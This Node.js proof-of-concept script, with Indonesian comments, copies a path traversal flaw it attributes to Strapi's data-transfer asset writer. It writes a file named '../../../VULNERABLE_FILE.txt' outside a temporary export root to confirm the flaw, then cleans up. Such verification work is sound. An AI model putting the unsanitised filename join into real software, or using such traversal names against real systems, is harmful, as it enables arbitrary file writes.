const fs = require('node:fs');
const fsPromises = require('node:fs/promises');
const path = require('node:path');
const { Readable, Writable, pipeline } = require('node:stream');
const os = require('node:os');

// Replika kode vulnerable dari Strapi
// Source: packages/core/data-transfer/src/directory/providers/destination/index.ts
function createVulnerableAssetsWriteStream(root) {
  return new Writable({
    objectMode: true,
    write(data, _encoding, callback) {
      const { filename } = data;
      // ! VULNERABLE: filename langsung di-join tanpa sanitasi
      const entryPath = path.join(root, 'assets', 'uploads', filename);
      const entryMetadataPath = path.join(root, 'assets', 'metadata', `${filename}.json`);

      try {
        fs.mkdirSync(path.dirname(entryPath), { recursive: true });
        fs.mkdirSync(path.dirname(entryMetadataPath), { recursive: true });
        fs.writeFileSync(entryMetadataPath, JSON.stringify(data.metadata), 'utf8');
        const fileStream = fs.createWriteStream(entryPath);
        pipeline(data.stream, fileStream, (err) => callback(err || null));
      } catch (error) {
        callback(error);
      }
    },
  });
}

async function main() {
  const exportRoot = await fsPromises.mkdtemp(path.join(os.tmpdir(), 'strapi-export-'));
  console.log(`Export root: ${exportRoot}`);

  // Asset dengan filename yang mengandung path traversal
  const maliciousFilename = '../../../VULNERABLE_FILE.txt';
  const asset = {
    filename: maliciousFilename,
    filepath: '/unused',
    stream: Readable.from('MALICIOUS CONTENT WRITTEN OUTSIDE EXPORT ROOT'),
    stats: { size: 50 },
    metadata: { id: 1, name: 'malicious' },
  };

  const writeStream = createVulnerableAssetsWriteStream(exportRoot);
  await new Promise((resolve, reject) => {
    writeStream.write(asset, (err) => (err ? reject(err) : resolve()));
  });
  writeStream.end();

  // Verifikasi: file ditulis di luar export root
  const resolvedPath = path.resolve(path.join(exportRoot, 'assets', 'uploads', maliciousFilename));
  const fileExists = fs.existsSync(resolvedPath);
  const isOutside = !resolvedPath.startsWith(exportRoot);

  console.log(`Resolved path: ${resolvedPath}`);
  console.log(`File exists: ${fileExists}`);
  console.log(`Outside export root: ${isOutside}`);
  console.log(`Result: ${fileExists && isOutside ? 'VULNERABLE' : 'NOT_CONFIRMED'}`);

  // Cleanup
  await fsPromises.rm(exportRoot, { recursive: true, force: true });
  await fsPromises.rm(resolvedPath, { force: true }).catch(() => {});
}

main().catch(console.error);
